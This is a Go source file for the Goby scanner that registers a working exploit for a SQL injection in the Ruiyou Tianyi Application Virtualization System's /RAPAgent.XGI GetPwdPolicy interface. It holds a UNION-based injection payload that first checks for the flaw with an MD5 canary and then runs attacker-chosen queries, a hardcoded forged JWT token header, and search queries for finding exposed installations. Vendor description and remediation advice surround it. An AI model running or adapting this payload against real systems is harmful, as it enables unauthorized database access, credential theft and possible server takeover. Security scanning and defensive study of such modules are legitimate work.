package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ruiyou Tianyi Application Virtualization System /RAPAgent.XGI SQL GetPwdPolicy Injection Vulnerability",
    "Description": "<p>The Ruiyou Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture, designed to centralize the deployment of various user applications onto the Ruiyou Tianyi service cluster. The /RAPAgent.XGI interface of the system has a SQL injection vulnerability, which attackers can exploit to obtain sensitive information from the database (such as administrator backend passwords and user personal information), and even write malicious code to the server under high privileges, further gaining system control.</p>",
    "Product": "REALOR-Tianyi-AVS",
    "Homepage": "http://www.realor.cn/",
    "DisclosureDate": "2025-01-08",
    "PostTime": "2025-01-08",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "title=\"瑞友天翼－应用虚拟化系统\" || (body=\"应用虚拟化系统\" && body=\"瑞友\") || body=\"CASMain.XGI?cmd=\" || body=\"瑞友天翼－应用虚拟化系统\" || body=\"DownLoad.XGI?pram=\"",
    "GobyQuery": "title=\"瑞友天翼－应用虚拟化系统\" || (body=\"应用虚拟化系统\" && body=\"瑞友\") || body=\"CASMain.XGI?cmd=\" || body=\"瑞友天翼－应用虚拟化系统\" || body=\"DownLoad.XGI?pram=\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and even execute malicious code under high privileges, potentially leading to data leakage, system crashes, and complete server control.</p>",
    "Recommendation": "<p>1. Strictly validate all input data to prevent SQL injection.2. Use parameterized queries or prepared statements for database operations.3. Restrict database user permissions to the minimum necessary.4. Conduct regular security audits to identify and fix potential vulnerabilities.5. Disable exposed interfaces on the Internet or set access permissions.6. Upgrade to the latest secure version provided by the vendor: <a href=\"http://www.realor.cn/product/tianyi/\">http://www.realor.cn/product/tianyi/</a>.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/ruU0K5ThqXw907S9zMAyRQ?token=1670173867&lang=zh_CN"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/RAPAgent.XGI?CMD=GetPwdPolicy&User=admin%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e7e7e%2C%28SELECT+MD5({{{rand_int}}})%29%2C0x7e7e7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-",
                "follow_redirect": true,
                "header": {
                    "X-De-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip, deflate, br"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/RAPAgent.XGI?CMD=GetPwdPolicy&User=admin%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e7e7e%2C%28{{{payload_encode}}}%29%2C0x7e7e7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-",
                "follow_redirect": true,
                "header": {
                    "X-De-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "~~~test~~~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "瑞友天翼应用虚拟化系统 /RAPAgent.XGI  GetPwdPolicy SQL 注入漏洞",
            "Product": "REALOR-天翼应用虚拟化系统",
            "Description": "<p>瑞友天翼应用虚拟化系统是一款基于服务器计算架构的应用虚拟化平台，旨在将用户的各种应用软件集中部署到瑞友天翼服务集群中。系统的 /RAPAgent.XGI 接口存在 SQL 注入漏洞，攻击者可利用该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1. 对所有输入数据进行严格验证，避免SQL注入。2. 使用参数化查询或预编译语句来处理数据库操作。3. 限制数据库用户权限，仅授予最低必要权限。4. 定期进行安全审计，发现并修复潜在的安全漏洞。5. 关闭互联网暴露的接口或设置访问权限。6. 升级至厂商提供的最新安全版本：<a href=\"http://www.realor.cn/product/tianyi/\">http://www.realor.cn/product/tianyi/</a>。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，甚至在高权限情况下执行恶意代码，可能导致数据泄露、系统崩溃以及服务器被完全控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Ruiyou Tianyi Application Virtualization System /RAPAgent.XGI SQL GetPwdPolicy Injection Vulnerability",
            "Product": "REALOR-Tianyi-AVS",
            "Description": "<p>The Ruiyou Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture, designed to centralize the deployment of various user applications onto the Ruiyou Tianyi service cluster. The /RAPAgent.XGI interface of the system has a SQL injection vulnerability, which attackers can exploit to obtain sensitive information from the database (such as administrator backend passwords and user personal information), and even write malicious code to the server under high privileges, further gaining system control.</p>",
            "Recommendation": "<p>1. Strictly validate all input data to prevent SQL injection.2. Use parameterized queries or prepared statements for database operations.3. Restrict database user permissions to the minimum necessary.4. Conduct regular security audits to identify and fix potential vulnerabilities.5. Disable exposed interfaces on the Internet or set access permissions.6. Upgrade to the latest secure version provided by the vendor: <a href=\"http://www.realor.cn/product/tianyi/\">http://www.realor.cn/product/tianyi/</a>.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, and even execute malicious code under high privileges, potentially leading to data leakage, system crashes, and complete server control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}//RAPAgent.XGI"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "rand_int",
        "rand_int_md5",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}